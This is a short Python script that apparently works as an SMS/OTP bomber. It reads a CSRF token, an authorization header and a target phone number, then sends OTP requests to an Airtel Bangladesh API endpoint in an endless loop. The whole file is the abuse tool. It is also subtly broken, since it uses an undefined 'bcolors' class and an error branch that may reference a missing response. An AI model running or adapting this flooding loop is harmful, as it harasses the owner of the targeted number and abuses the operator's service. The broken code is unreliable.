import requests
from requests.structures import CaseInsensitiveDict

url = "https://api.bd.airtel.com/v1/otp/send_request"
headers = CaseInsensitiveDict()
headers["X-CSRF-TOKEN"] = str(input("Enter CSRF Token: "))
headers["Authorization"] = str(input("Enter Authorization: "))
headers["Content-Type"] = "application/json"
number=str(input("Enter Your Number: ")) 
data = """
{
  \"phone_number\": \""""+number+"""\",
  "lang": "en",
  "type": "internet_package",
  "plan_type": "internet_package",
  "uid": "32fbec34-da38-4939-a9c7-b43a8aafe09c"
}
"""
while 1:
	try:
		resp = requests.post(url, headers=headers, data=data)
		print(f"{bcolors.OKYELLOW}{bcolors.BOLD}")
	except:
		print(resp.text)
